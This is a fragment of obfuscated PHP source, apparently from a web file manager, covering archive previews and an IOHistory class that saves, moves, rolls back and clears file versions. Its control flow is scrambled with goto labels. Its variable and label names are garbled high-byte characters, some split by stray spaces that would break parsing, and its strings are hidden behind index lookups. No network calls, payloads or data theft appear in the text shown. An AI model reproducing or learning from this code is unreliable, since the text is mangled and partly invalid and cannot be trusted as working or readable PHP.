isset($c²…ÔÇ›îà[$B‰ƒ¶Éƒ‚à[1094]]) ? $c²…ÔÇ›îà[$B‰ƒ¶Éƒ‚à[1094]] : !1; $eä«ÈñÌĞ = isset($c²…ÔÇ›îà[$B‰ƒ¶Éƒ‚à[28]]) ? $c²…ÔÇ›îà[$B‰ƒ¶Éƒ‚à[28]] : $B‰ƒ¶Éƒ‚à[33]; KodArchive::filePreview($e¡æ—À¬¿Ó, $bªÄÇè¥Ô, $e—½İ£µ«›, $eä«ÈñÌĞ); self::archiveExt(); die; } $a˜Úœ‘ò­¾ = KodArchive::listContent($e¡æ—À¬¿Ó); goto d¹»ê·ò˜Ğ; C¿™³Æ„ò: $B‰ƒ¶Éƒ‚à =& $_SERVER[Ç³Íß¦Ó]; $a³õ½´•ì = $c²…ÔÇ›îà[$B‰ƒ¶Éƒ‚à[76]]; $bªÄÇè¥Ô = isset($c²…ÔÇ›îà[$B‰ƒ¶Éƒ‚à[1090]]) ? $c²…ÔÇ›îà[$B‰ƒ¶Éƒ‚à[1090]] : -1; goto aŠÏàÒ©; C„Ì«“‹åˆ: return $a˜Úœ‘ò­¾[$B‰ƒ¶Éƒ‚à[1088]]; goto EÆñéä°Êï; fø‹õóÈ…: if (isset($cğ„èãŠÛ)) { $eĞ‰¯¨Şœğ = array($cğ„èãŠÛ[$B‰ƒ¶Éƒ‚à[76]], $cğ„èãŠÛ[$B‰ƒ¶Éƒ‚à[1090]], $cğ„èãŠÛ[$B‰ƒ¶Éƒ‚à[28]]); $F‰Í–¶œÒ· = md5(implode($B‰ƒ¶Éƒ‚à[71], $eĞ‰¯¨Şœğ)) . $B‰ƒ¶Éƒ‚à[95] . get_path_ext($cğ„èãŠÛ[$B‰ƒ¶Éƒ‚à[28]]); } else { $eĞ‰¯¨Şœğ = array($C’¨’èˆ¬[$B‰ƒ¶Éƒ‚à[28]], $C’¨’èˆ¬[$B‰ƒ¶Éƒ‚à[76]], $C’¨’èˆ¬[$B‰ƒ¶Éƒ‚à[78]]); $F‰Í–¶œÒ· = md5(implode($B‰ƒ¶Éƒ‚à[71], $eĞ‰¯¨Şœğ)) . $B‰ƒ¶Éƒ‚à[95] . $d“­´ËÀºì; } if ($bªÄÇè¥Ô == -1) { $eô—Ñò¼ß‰ = IO_PATH_SYSTEM_TEMP . "\172\x69\160\126\151\x65\x77\57{$B£ÉÚªÉÉñ}\x2f{$F‰Í–¶œÒ·}\x2e\154\157\147"; $BÜŠÙà—Ğ² = self::infoFull($eô—Ñò¼ß‰); if ($BÜŠÙà—Ğ²) { $eô—Ñò¼ß‰ = $BÜŠÙà—Ğ²[$B‰ƒ¶Éƒ‚à[76]]; $FÉ½é¥»¯È = self::getContent($eô—Ñò¼ß‰); if ($FÉ½é¥»¯È) { $fƒßÈå¿ˆÈ = json_decode($FÉ½é¥»¯È, !0); if (count($fƒßÈå¿ˆÈ) >= $bİİÏÄ¶É) { show_json(sprintf(LNG($B‰ƒ¶Éƒ‚à[1092]), count($fƒßÈå¿ˆÈ)), !1); } return $fƒßÈå¿ˆÈ; } } else { $eô—Ñò¼ß‰ = self::mkfile($eô—Ñò¼ß‰); } } $BºìÆ†æ°´ = TEMP_FILES . $B£ÉÚªÉÉñ; goto D‰«ÈÏãª; d¹»ê·ò˜Ğ: self::archiveExt(); del_dir($BºìÆ†æ°´); if (!$a˜Úœ‘ò­¾[$B‰ƒ¶Éƒ‚à[1086]]) { show_json($a˜Úœ‘ò­¾[$B‰ƒ¶Éƒ‚à[1088]], !1); } goto cñ˜¿çã¾—; EÆñéä°Êï: } private static function fileExt($aŠÕ—®ĞÙÆ) { $D¤Ô¨ÇİÉƒ =& $_SERVER[Ç³Íß¦Ó]; $f«’¸½Ñ = $aŠÕ—®ĞÙÆ[$D¤Ô¨ÇİÉƒ[168]]; if ($f«’¸½Ñ == $D¤Ô¨ÇİÉƒ[1095]) { $eÍÒŞ´ÆŞ = $D¤Ô¨ÇİÉƒ[1096]; if (substr($aŠÕ—®ĞÙÆ[$D¤Ô¨ÇİÉƒ[28]], -strlen($eÍÒŞ´ÆŞ)) == $eÍÒŞ´ÆŞ) { $f«’¸½Ñ = $D¤Ô¨ÇİÉƒ[1097]; } } self::archiveExt($f«’¸½Ñ); return $f«’¸½Ñ; } private static function zipFileList($f‡Á©ÑòÛß, $d®É›ˆæ¢â = false) { $f®Ô¤»’‹Ò =& $_SERVER[Ç³Íß¦Ó]; $bø‚‹ô‰¾ = array(); foreach ($f‡Á©ÑòÛß as $DÏ¥çà´ê§) { $AµÅİ‡››‡ = $DÏ¥çà´ê§[$f®Ô¤»’‹Ò[76]]; if ($d®É›ˆæ¢â) { $AµÅİ‡››‡ = self::copy($DÏ¥çà´ê§[$f®Ô¤»’‹Ò[76]], $d®É›ˆæ¢â, $f®Ô¤»’‹Ò[784]); } else { $eéí¿ëÑ¶ = self::init($DÏ¥çà´ê§[$f®Ô¤»’‹Ò[76]]); if ($eéí¿ëÑ¶->getType() == $f®Ô¤»’‹Ò[106]) { $AµÅİ‡››‡ = $eéí¿ëÑ¶->path; } } if ($AµÅİ‡››‡ && self::local()->exist($AµÅİ‡››‡)) { $bø‚‹ô‰¾[$DÏ¥çà´ê§[$f®Ô¤»’‹Ò[76]]] = $AµÅİ‡››‡; } } if (!empty($bø‚‹ô‰¾)) { return array_values($bø‚‹ô‰¾); } show_json(LNG($f®Ô¤»’‹Ò[1061]), !1); } public static function tmpFileName($Få¢µĞ‰„³) { $bïƒçéÖĞ© =& $_SERVER[Ç³Íß¦Ó]; $fÅ§‰İçĞ = array($Få¢µĞ‰„³[$bïƒçéÖĞ©[28]], $Få¢µĞ‰„³[$bïƒçéÖĞ©[76]], $Få¢µĞ‰„³[$bïƒçéÖĞ©[78]], $Få¢µĞ‰„³[$bïƒçéÖĞ©[485]]); return md5(implode($bïƒçéÖĞ©[71], $fÅ§‰İçĞ)); } private static function localFilePath($dµßŞŒ¤‹, $EçÙìä¡Ë) { goto fÓÅ¸Üù‰¢; e‚¦¿¨à: if ($d‹Ù‡ÚÉİÑ[$cÇ³—ç¦˜­[29]] == KodIO::KOD_SOURCE) { $b¿¼Ê°É¸’ = Model($cÇ³—ç¦˜­[791])->fileInfoGet(KodIO::sourceID($dµßŞŒ¤‹)); if (!$b¿¼Ê°É¸’[$cÇ³—ç¦˜­[76]]) { show_json($cÇ³—ç¦˜­[1100], !1); } $dµßŞŒ¤‹ = $b¿¼Ê°É¸’[$cÇ³—ç¦˜­[76]]; } $aÔ†ÆˆÎÚ = self::init($dµßŞŒ¤‹); $aÊØËß = $aÔ†ÆˆÎÚ->getType(); goto A¼ª‰ Ø½; fÓÅ¸Üù‰¢: $cÇ³—ç¦˜­ =& $_SERVER[Ç³Íß¦Ó]; if ($EçÙìä¡Ë == $cÇ³—ç¦˜­[1098] && strtoupper(substr(PHP_OS, 0, 3)) == $cÇ³—ç¦˜­[1099]) { return !1; } $d‹Ù‡ÚÉİÑ = KodIO::parse($dµßŞŒ¤‹); goto e‚¦¿¨à; A¼ª‰ Ø½: if ($aÊØËß == $cÇ³—ç¦˜­[106] || $aÊØËß == $cÇ³—ç¦˜­[1101]) { if (!$aÔ†ÆˆÎÚ->exist($aÔ†ÆˆÎÚ->path)) { show_json(LNG($cÇ³—ç¦˜­[105]), !1); } return $aÔ†ÆˆÎÚ->path; } return !1; goto f¶µÕ”âÖ›; f¶µÕ”âÖ›: } private static function archiveExt($D½„†™Şîö = '') { $GLOBALS[$_SERVER[Ç³Íß¦Ó][1102]] = $D½„†™Şîö; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto aè§©ªŞ¡ù; aè§©ªŞ¡ù: $DÑŞ¹áÁ =& $_SERVER[Ç³Íß¦Ó]; $F˜ƒØÅ¤óÔ = $GLOBALS[$DÑŞ¹áÁ[6]][$DÑŞ¹áÁ[88]]; if ($F˜ƒØÅ¤óÔ[$DÑŞ¹áÁ[1103]] != 1) { return; } goto fòÕœÖ©ãà; aÃ‚ùøŒ’¥: Hook::bind($DÑŞ¹áÁ[1114], $DÑŞ¹áÁ[1115]); Hook::bind($DÑŞ¹áÁ[1116], $DÑŞ¹áÁ[1117]); goto D¨ã²”Ğê; EõäåÚ¾ˆÄ: Hook::bind($DÑŞ¹áÁ[1108], $DÑŞ¹áÁ[1109]); Hook::bind($DÑŞ¹áÁ[1110], $DÑŞ¹áÁ[1111]); Hook::bind($DÑŞ¹áÁ[1112], $DÑŞ¹áÁ[1113]); goto aÃ‚ùøŒ’¥; fòÕœÖ©ãà: if ($F˜ƒØÅ¤óÔ[$DÑŞ¹áÁ[1104]] <= 0) { return; } if (isset($_REQUEST[$DÑŞ¹áÁ[1105]]) && $_REQUEST[$DÑŞ¹áÁ[1105]] == $DÑŞ¹áÁ[87]) { return; } Hook::bind($DÑŞ¹áÁ[1106], $DÑŞ¹áÁ[1107]); goto EõäåÚ¾ˆÄ; D¨ã²”Ğê: } public static function eventBeforeUpload($C‚ˆ‹Ó®—ï) { if ($C‚ˆ‹Ó®—ï[3] && $C‚ˆ‹Ó®—ï[3] != REPEAT_REPLACE) { return; } $dÆ§¥Ÿè = self::parsePath($C‚ˆ‹Ó®—ï[0]); if (!$dÆ§¥Ÿè) { return; } self::add($dÆ§¥Ÿè); } public static function eventBeforeEdit($d—…«‡Ã«) { $EÃ¶˜¤ŠñŒ = self::parsePath($d—…«‡Ã«[0]); if (!$EÃ¶˜¤ŠñŒ) { return; } self::add($EÃ¶˜¤ŠñŒ); } public static function eventBeforeCopyFile($EÍ™Ğ‰¢÷­, $c”™éÒ‡ö–, $C……Ùí›ñ¢, $aÀ’ö®Ê¶, $d†…°İ™Ê†, $dàô¯ƒÕ¸ª) { $eÇœƒ†óí = $C……Ùí›ñ¢->getPathOuter($aÀ’ö®Ê¶); $dœåã…Ä¶† = self::parsePath($eÇœƒ†óí); if (!$dœåã…Ä¶†) { return; } self::add($dœåã…Ä¶†); } public static function eventBeforeRename($F¶‚Ï°—¸) { $cÂòÇğåë¿ =& $_SERVER[Ç³Íß¦Ó]; $Dïù¬äÅ·Ô = self::parsePath($F¶‚Ï°—¸[0]); if (!$Dïù¬äÅ·Ô) { return; } $FŠõŠ§Ò’ì = self::checkInHistory($Dïù¬äÅ·Ô); if (!$FŠõŠ§Ò’ì) { return; } if ($FŠõŠ§Ò’ì[$cÂòÇğåë¿[29]] == $cÂòÇğåë¿[192]) { $aµ×•òÏ’‰ = self::listData($Dïù¬äÅ·Ô); if ($aµ×•òÏ’‰ && $aµ×•òÏ’‰[$cÂòÇğåë¿[366]]) { self::moveHistory($Dïù¬äÅ·Ô, $F¶‚Ï°—¸[1]); } } else { IO::rename($FŠõŠ§Ò’ì[$cÂòÇğåë¿[76]], $F¶‚Ï°—¸[1]); } } public static function eventBeforeMove($aïˆ‡Ô’ß) { goto d®šÂÇÕ„; d®šÂÇÕ„: $B­ßø½©‡Ú =& $_SERVER[Ç³Íß¦Ó]; $DÖ‡êÙ‡Ú‚ = self::parsePath($aïˆ‡Ô’ß[0]); if (!$DÖ‡êÙ‡Ú‚) { return; } goto eŸÜ»˜›éŠ; eŸÜ»˜›éŠ: $e‹¿ÇÌ¡ö = self::parsePath($aïˆ‡Ô’ß[1]); if (!$e‹¿ÇÌ¡ö) { return; } $e„æõ¬¨Ïó = $aïˆ‡Ô’ß[3]; goto D¸–³„Áä½; D¸–³„Áä½: $b£Òó©÷òÑ = self::checkInHistory($DÖ‡êÙ‡Ú‚); if (!$b£Òó©÷òÑ) { return; } $A šÂ…—Ö = self::pathHistory($e‹¿ÇÌ¡ö); goto BĞ¯©¿ÁÖ‚; BĞ¯©¿ÁÖ‚: if ($b£Òó©÷òÑ[$B­ßø½©‡Ú[29]] == $B­ßø½©‡Ú[192]) { $aŠ±í”ÛËø = self::listData($DÖ‡êÙ‡Ú‚); $EëÇ´ñõåÔ = rtrim($e‹¿ÇÌ¡ö, $B­ßø½©‡Ú[8]) . $B­ßø½©‡Ú[8] . ($e„æõ¬¨Ïó ? $e„æõ¬¨Ïó : get_path_this($DÖ‡êÙ‡Ú‚)); $eï”ğÚÓ¼ = self::listData($EëÇ´ñõåÔ); if ($aŠ±í”ÛËø && $aŠ±í”ÛËø[$B­ßø½©‡Ú[366]] && $eï”ğÚÓ¼ && $eï”ğÚÓ¼[$B­ßø½©‡Ú[366]]) { return self::clear($DÖ‡êÙ‡Ú‚); } if ($aŠ±í”ÛËø && $aŠ±í”ÛËø[$B­ßø½©‡Ú[366]]) { self::moveHistory($DÖ‡êÙ‡Ú‚, $e„æõ¬¨Ïó, $A šÂ…—Ö); } } else { IO::move($b£Òó©÷òÑ[$B­ßø½©‡Ú[76]], $A šÂ…—Ö, !1, $e„æõ¬¨Ïó); self::clearEmptyFolder(IO::pathFather($b£Òó©÷òÑ[$B­ßø½©‡Ú[76]])); } goto cŠ‚§‹ŠÍƒ; cŠ‚§‹ŠÍƒ: } public static function eventAfterRemove($CéŞ÷³¨ù, $B™š…†½ó) { goto a÷”ùÍÇê„; a÷”ùÍÇê„: $eÀ”ó¸ò¥ =& $_SERVER[Ç³Íß¦Ó]; if (!$B™š…†½ó) { return; } $bù“†Ä•Ç = self::parsePath($CéŞ÷³¨ù[0]); goto aŒÖ‹¢Óã³; aŒÖ‹¢Óã³: if (!$bù“†Ä•Ç) { return; } $Fµò†Ì¤œÖ = self::checkInHistory($bù“†Ä•Ç); if (!$Fµò†Ì¤œÖ) { return; } goto fö¥ËÃ«Æ‰; fö¥ËÃ«Æ‰: if ($Fµò†Ì¤œÖ[$eÀ”ó¸ò¥[29]] == $eÀ”ó¸ò¥[192]) { $DÑ¸±¶œ­Ê = self::listData($bù“†Ä•Ç, !1); if ($DÑ¸±¶œ­Ê && $DÑ¸±¶œ­Ê[$eÀ”ó¸ò¥[366]]) { self::clear($bù“†Ä•Ç, !1); } } else { IO::remove($Fµò†Ì¤œÖ[$eÀ”ó¸ò¥[76]]); self::clearEmptyFolder(IO::pathFather($Fµò†Ì¤œÖ[$eÀ”ó¸ò¥[76]])); } goto EÜöŞ³«ÉŒ; EÜöŞ³«ÉŒ: } private static function checkInHistory($E¨™ÙîŞšà) { $AÏğİ˜ôîŠ = self::pathHistory($E¨™ÙîŞšà); if (!IO::exist($AÏğİ˜ôîŠ)) { $AÏğİ˜ôîŠ .= $_SERVER[Ç³Íß¦Ó][1118]; } return IO::exist($AÏğİ˜ôîŠ) ? IO::info($AÏğİ˜ôîŠ) : !1; } private static function parsePath($aÆÑÃ¹ˆ¡) { goto c¨™¨ˆº†à; aÓÓ—›²: $aŞŒç´Ñ“Ş = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Fæ³ÇÏ¢Á¿[1121]); foreach ($aŞŒç´Ñ“Ş as $f¥’¬·¦§Â) { if (!$E††²…Ë™ && substr($aÆÑÃ¹ˆ¡, 0, strlen($f¥’¬·¦§Â)) == $f¥’¬·¦§Â) { return !1; } } self::log($GLOBALS[$Fæ³ÇÏ¢Á¿[1043]] . $Fæ³ÇÏ¢Á¿[1122] . $aÆÑÃ¹ˆ¡); goto F…ÕØ×’ˆ; F…ÕØ×’ˆ: return $aÆÑÃ¹ˆ¡; goto d­¿À–×; Dùôƒáö®: if (!$a´ŒËª–µ || !$C×ìÔë®£Ï[$Fæ³ÇÏ¢Á¿[1120]]) { return !1; } if ($E††²…Ë™ == KodIO::KOD_SHARE_ITEM) { $FÈòÖ±ù„é = IO::init($aÆÑÃ¹ˆ¡); if ($FÈòÖ±ù„é->pathParse[$Fæ³ÇÏ¢Á¿[1048]]) { return self::parsePath($FÈòÖ±ù„é->pathParse[$Fæ³ÇÏ¢Á¿[1048]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto aÓÓ—›²; bâÎ¨™°Èì: $C×ìÔë®£Ï = KodIO::parse($aÆÑÃ¹ˆ¡); $E††²…Ë™ = $C×ìÔë®£Ï[$Fæ³ÇÏ¢Á¿[29]]; $a´ŒËª–µ = !$E††²…Ë™ || $E††²…Ë™ == KodIO::KOD_IO || $E††²…Ë™ == KodIO::KOD_SHARE_ITEM; goto Dùôƒáö®; c¨™¨ˆº†à: $Fæ³ÇÏ¢Á¿ =& $_SERVER[Ç³Íß¦Ó]; if (!$aÆÑÃ¹ˆ¡) { return !1; } if ($GLOBALS[$Fæ³ÇÏ¢Á¿[1119]]) { return; } goto bâÎ¨™°Èì; d­¿À–×: } private static function pathHistory($F©Ö¹‘‹ƒ) { $BÌÂŒ¡µ…î =& $_SERVER[Ç³Íß¦Ó]; $EàÏŞ‚Ş‡Ï = self::$_historyBase . ltrim(KodIO::clear($F©Ö¹‘‹ƒ), $BÌÂŒ¡µ…î[8]); $EàÏŞ‚Ş‡Ï = str_replace(array($BÌÂŒ¡µ…î[1123]), array($BÌÂŒ¡µ…î[1124]), $EàÏŞ‚Ş‡Ï); return $EàÏŞ‚Ş‡Ï; } public static function log($C†‰ÀÆˆ‹) { } public static function historyCount($A¹ËçÉĞÇÁ) { $A»–ƒŒ–§ =& $_SERVER[Ç³Íß¦Ó]; $E‘¿Ñäï¶ = array(); $aâµ°æƒ° = array(); foreach ($A¹ËçÉĞÇÁ as $CùË«†ÉÓ³) { $DÖ²­÷ÆùĞ = get_path_father($CùË«†ÉÓ³); if (!$aâµ°æƒ°[$DÖ²­÷ÆùĞ]) { $aâµ°æƒ°[$DÖ²­÷ÆùĞ] = array(); } $aâµ°æƒ°[$DÖ²­÷ÆùĞ][] = get_path_this($CùË«†ÉÓ³); } foreach ($aâµ°æƒ° as $DÖ²­÷ÆùĞ => $d³­İ–¦£Ó) { $FòÙ¡çßÉ = self::parsePath($DÖ²­÷ÆùĞ); if (!$FòÙ¡çßÉ) { continue; } foreach ($d³­İ–¦£Ó as $a†‰´ˆ£ƒÍ) { $a—ùöŒÆÏ = self::listData(rtrim($FòÙ¡çßÉ, $A»–ƒŒ–§[8]) . $A»–ƒŒ–§[8] . $a†‰´ˆ£ƒÍ, !1); if ($a—ùöŒÆÏ && $a—ùöŒÆÏ[$A»–ƒŒ–§[366]]) { $E‘¿Ñäï¶[rtrim($DÖ²­÷ÆùĞ, $A»–ƒŒ–§[8]) . $A»–ƒŒ–§[8] . $a†‰´ˆ£ƒÍ] = count($a—ùöŒÆÏ[$A»–ƒŒ–§[366]]); } } } return $E‘¿Ñäï¶; } public static function add($C©àÃƒ”ƒ) { goto F†¿‚»¢«Í; eÆ‹ÜÓ¸æ»: if ($f’£ïº’Ê‚ <= 0) { return; } $C“Õ«øä‚Œ = IO::hashSimple($C©àÃƒ”ƒ); $E‹Ö°îÃ­ = IO::info($C©àÃƒ”ƒ); goto a„ÇšÃ“æ; f¼æÔ®ø‹’: $bâ×ğ¹êÙ = Model($bŠóÜÂ—˜[731])->get($bŠóÜÂ—˜[1125]); $f’£ïº’Ê‚ = $GLOBALS[$bŠóÜÂ—˜[6]][$bŠóÜÂ—˜[88]][$bŠóÜÂ—˜[1104]]; $cÏ³£¢á¡ = $bâ×ğ¹êÙ == $bŠóÜÂ—˜[1126] ? 5 : $f’£ïº’Ê‚; goto eÆ‹ÜÓ¸æ»; F¬®æÏÃÉÖ: if (!$B‹‚¶šƒÄ) { self::clearEmptyFolder($fÒƒË“­[$bŠóÜÂ—˜[1129]]); return !1; } array_unshift($bîŒ¼¶¡‹–, $AÌø•Ñ¨‡´); if (count($bîŒ¼¶¡‹–) > $cÏ³£¢á¡) { $aÜàä›Ë×Ü = array_slice($bîŒ¼¶¡‹–, $cÏ³£¢á¡); foreach ($aÜàä›Ë×Ü as $EóÁÑßÊ½Ö) { IO::remove($fÒƒË“­[$bŠóÜÂ—˜[1129]] . $EóÁÑßÊ½Ö[$bŠóÜÂ—˜[28]]); } $bîŒ¼¶¡‹– = array_slice($bîŒ¼¶¡‹–, 0, $cÏ³£¢á¡); } goto E¾ÛÜ¥Û—; E¾ÛÜ¥Û—: return self::saveData($fÒƒË“­[$bŠóÜÂ—˜[1130]], $bîŒ¼¶¡‹–); goto d¦¹ç—¢¿É; dê—¢âå¼: $AÌø•Ñ¨‡´ = array($bŠóÜÂ—˜[392] => $F–Â­’ìß, $bŠóÜÂ—˜[171] => $C“Õ«øä‚Œ, $bŠóÜÂ—˜[28] => $E‹Ö°îÃ­[$bŠóÜÂ—˜[28]] . $bŠóÜÂ—˜[95] . date($bŠóÜÂ—˜[1127]) . rand_string(1), $bŠóÜÂ—˜[78] => $E‹Ö°îÃ­[$bŠóÜÂ—˜[78]], $bŠóÜÂ—˜[430] => USER_ID, $bŠóÜÂ—˜[193] => time(), $bŠóÜÂ—˜[1128] => $bŠóÜÂ—˜[33]); IO::mkdir($fÒƒË“­[$bŠóÜÂ—˜[1129]]); $B‹‚¶šƒÄ = IO::copy($C©àÃƒ”ƒ, $fÒƒË“­[$bŠóÜÂ—˜[1129]], !1, $AÌø•Ñ¨‡´[$bŠóÜÂ—˜[28]]); goto F¬®æÏÃÉÖ; a„ÇšÃ“æ: $bîŒ¼¶¡‹– = $fÒƒË“­[$bŠóÜÂ—˜[366]]; if ($E‹Ö°îÃ­[$bŠóÜÂ—˜[78]] == 0) { return; } if ($E‹Ö°îÃ­[$bŠóÜÂ—˜[78]] >= 1024 * 1024 * 500) { return !1; } goto fî¥©‹¸§ˆ; fî¥©‹¸§ˆ: if ($bîŒ¼¶¡‹– && $bîŒ¼¶¡‹–[0][$bŠóÜÂ—˜[171]] == $C“Õ«øä‚Œ) { return !0; } if (array_key_exists($bŠóÜÂ—˜[195], $E‹Ö°îÃ­) && !$E‹Ö°îÃ­[$bŠóÜÂ—˜[195]]) { return !1; } $F–Â­’ìß = short_id(time()); goto dê—¢âå¼; F†¿‚»¢«Í: $bŠóÜÂ—˜ =& $_SERVER[Ç³Íß¦Ó]; $fÒƒË“­ = self::listData($C©àÃƒ”ƒ); if (!$fÒƒË“­) { return; } goto f¼æÔ®ø‹’; d¦¹ç—¢¿É: } public static function remove($EŠÈÇáÚØğ, $bñ‘Ã½¥’) { $cõ‰¼¢ë‡ =& $_SERVER[Ç³Íß¦Ó]; $A£é­«‹›ô = self::listData($EŠÈÇáÚØğ); $B÷ÆŒÕËÃ = array(); if (!$A£é­«‹›ô) { return !1; } foreach ($A£é­«‹›ô[$cõ‰¼¢ë‡[366]] as $cØ…ØÑ²Ü) { if ($cØ…ØÑ²Ü[$cõ‰¼¢ë‡[392]] == $bñ‘Ã½¥’) { IO::remove($A£é­«‹›ô[$cõ‰¼¢ë‡[1129]] . $cØ…ØÑ²Ü[$cõ‰¼¢ë‡[28]]); continue; } $B÷ÆŒÕËÃ[] = $cØ…ØÑ²Ü; } return self::saveData($A£é­«‹›ô[$cõ‰¼¢ë‡[1130]], $B÷ÆŒÕËÃ); } public static function clear($F„‰š‘®ºŠ, $F¨í’¡Ë®Ú = true) { $D×®‹Æ°¥Ç =& $_SERVER[Ç³Íß¦Ó]; $b“¬Œ‚à—Œ = self::listData($F„‰š‘®ºŠ, $F¨í’¡Ë®Ú); if (!$b“¬Œ‚à—Œ) { return !1; } foreach ($b“¬Œ‚à—Œ[$D×®‹Æ°¥Ç[366]] as $A„÷Û‘‹‹À) { IO::remove($b“¬Œ‚à—Œ[$D×®‹Æ°¥Ç[1129]] . $A„÷Û‘‹‹À[$D×®‹Æ°¥Ç[28]]); } return self::saveData($b“¬Œ‚à—Œ[$D×®‹Æ°¥Ç[1130]], array()); } public static function moveHistory($Bìç‘ŞÛŞ, $CÇ¶í¾ƒ¦  = '', $E—ö´Úƒö÷ = '') { goto b¯æ–À¿ˆé; b¯æ–À¿ˆé: $Aôø—†Îä =& $_SERVER[Ç³Íß¦Ó]; $A„©Ò¿ÀèÃ = self::listData($Bìç‘ŞÛŞ, !1); if (!$A„©Ò¿ÀèÃ || !$A„©Ò¿ÀèÃ[$Aôø—†Îä[366]]) { return !1; } goto e™ëœ†´Ê; cÌ¼«øÛ÷: self::saveData($A„©Ò¿ÀèÃ[$Aôø—†Îä[1130]], $A„©Ò¿ÀèÃ[$Aôø—†Îä[366]]); self::clearEmptyFolder($A„©Ò¿ÀèÃ[$Aôø—†Îä[1129]]); goto BÀø÷¸š‰æ; C°ŒÎ¥âğ¡: $E¦ŠÒŠÆ½‘ = substr(get_path_this($A„©Ò¿ÀèÃ[$Aôø—†Îä[1130]]), 0, -strlen($eòËßàìŸ‰)); foreach ($A„©Ò¿ÀèÃ[$Aôø—†Îä[366]] as $e‡¸˜¡ƒÊ => $dĞÀçÊ­³¾) { $f¼Œ¬íö = $CÇ¶í¾ƒ¦  . substr($dĞÀçÊ­³¾[$Aôø—†Îä[28]], strlen($E¦ŠÒŠÆ½‘)); $a÷·‹¬İÆî = IO::move($A„©Ò¿ÀèÃ[$Aôø—†Îä[1129]] . $dĞÀçÊ­³¾[$Aôø—†Îä[28]], $E—ö´Úƒö÷, !1, $f¼Œ¬íö); if ($a÷·‹¬İÆî) { $A„©Ò¿ÀèÃ[$Aôø—†Îä[366]][$e‡¸˜¡ƒÊ][$Aôø—†Îä[28]] = $f¼Œ¬íö; } } $A„©Ò¿ÀèÃ[$Aôø—†Îä[1130]] = IO::move($A„©Ò¿ÀèÃ[$Aôø—†Îä[1130]], $E—ö´Úƒö÷, !1, $CÇ¶í¾ƒ¦  . $eòËßàìŸ‰); goto cÌ¼«øÛ÷; e™ëœ†´Ê: $eòËßàìŸ‰ = $Aôø—†Îä[1118]; $CÇ¶í¾ƒ¦  = $CÇ¶í¾ƒ¦  ? $CÇ¶í¾ƒ¦  : get_path_this($Bìç‘ŞÛŞ); $E—ö´Úƒö÷ = $E—ö´Úƒö÷ ? $E—ö´Úƒö÷ : $A„©Ò¿ÀèÃ[$Aôø—†Îä[1129]]; goto C°ŒÎ¥âğ¡; BÀø÷¸š‰æ: } public static function rollback($F©ğ›¥Ôò, $c¾°¼ÒÅé¶) { $f¦¡ «Ö‰ù =& $_SERVER[Ç³Íß¦Ó]; $a³¡‘ÑŒ§– = self::listData($F©ğ›¥Ôò); if (!$a³¡‘ÑŒ§–) { return; } $dòÑˆ»ºçù = IO::info($F©ğ›¥Ôò); foreach ($a³¡‘ÑŒ§–[$f¦¡ «Ö‰ù[366]] as $AÍ×ÉĞ•Ó => $C¶¨ÔÛÅ) { if ($C¶¨ÔÛÅ[$f¦¡ «Ö‰ù[392]] == $c¾°¼ÒÅé¶) { self::add($F©ğ›¥Ôò); $d¡ËÅÊ‰Ñ = $a³¡‘ÑŒ§–[$f¦¡ «Ö‰ù[1129]] . $C¶¨ÔÛÅ[$f¦¡ «Ö‰ù[28]]; $A½á–Åì»Í = IO::copy($d¡ËÅÊ‰Ñ, IO::pathFather($F©ğ›¥Ôò), REPEAT_REPLACE, $dòÑˆ»ºçù[$f¦¡ «Ö‰ù[28]]); if ($A½á–Åì»Í) { self::remove($F©ğ›¥Ôò, $c¾°¼ÒÅé¶); } return $A½á–Åì»Í; } } return !1; } public static function setDetail($e‰òÒµÃñ², $e®½¤óˆ‚, $dñä¡ÜÌ) { $f²êéÛÉğ§ =& $_SERVER[Ç³Íß¦Ó]; $a÷¬ÌÒŠè = self::listData($e‰òÒµÃñ²); if (!$a÷¬ÌÒŠè) { return; } foreach ($a÷¬ÌÒŠè[$f²êéÛÉğ§[366]] as $F„³ˆ«ä => $c†ˆ…¸¾š) { if ($c†ˆ…¸¾š[$f²êéÛÉğ§[392]] == $e®½¤óˆ‚) { $a÷¬ÌÒŠè[$f²êéÛÉğ§[366]][$F„³ˆ«ä][$f²êéÛÉğ§[1128]] = $dñä¡ÜÌ; self::saveData($a÷¬ÌÒŠè[$f²êéÛÉğ§[1130]], $a÷¬ÌÒŠè[$f²êéÛÉğ§[366]]); return !0; } } return !1; } public static function fileInfo($b‚Í©öˆİ©, $dÉëœã¿Õğ) { goto CÉñœÙš‹¡; Aî»×ÏÒ÷: return IO::info($FÒ¤áŞ‚—Œ); goto föÀ˜•…ä¢; AœÃÈñ™°Ã: $FÒ¤áŞ‚—Œ = $b¤¸ÑÔñŞ[33]; foreach ($Aêï­å“¡å[$b¤¸ÑÔñŞ[366]] as $e™Îˆ½ƒ¡È => $BƒåÈ˜àİï) { if ($BƒåÈ˜àİï[$b¤¸ÑÔñŞ[392]] != $dÉëœã¿Õğ) { continue; } $FÒ¤áŞ‚—Œ = $Aêï­å“¡å[$b¤¸ÑÔñŞ[1129]] . $BƒåÈ˜àİï[$b¤¸ÑÔñŞ[28]]; break; } if (!$FÒ¤áŞ‚—Œ) { show_json(LNG($b¤¸ÑÔñŞ[105]), !1); } goto Aî»×ÏÒ÷; CÉñœÙš‹¡: $b¤¸ÑÔñŞ =& $_SERVER[Ç³Íß¦Ó]; $Aêï­å“¡å = self::listData($b‚Í©öˆİ©); if (!$Aêï­å“¡å) { show_json(LNG($b¤¸ÑÔñŞ[105]), !1); } goto AœÃÈñ™°Ã; föÀ˜•…ä¢: } public static function fileOut($Dà °¸ï, $a¡Áã¬º—, $bÙŠ´£‰ = false) { $f’ëå›ë Ã =& $_SERVER[Ç³Íß¦Ó]; $C…Û†çÀÃ„ = self::fileInfo($Dà °¸ï, $a¡Áã¬º—); $cí·¨´ÃôÉ =& $GLOBALS[$f’ëå›ë Ã[7]]; $bÙŠ´£‰ = isset($cí·¨´ÃôÉ[$f’ëå›ë Ã[1094]]) && $cí·¨´ÃôÉ[$f’ëå›ë Ã[1094]] == 1; if (isset($cí·¨´ÃôÉ[$f’ëå›ë Ã[29]]) && $cí·¨´ÃôÉ[$f’ëå›ë Ã[29]] == $f’ëå›ë Ã[1131]) { return IO::fileOutImage($C…Û†çÀÃ„[$f’ëå›ë Ã[76]], $cí·¨´ÃôÉ[$f’ëå›ë Ã[1132]]); } 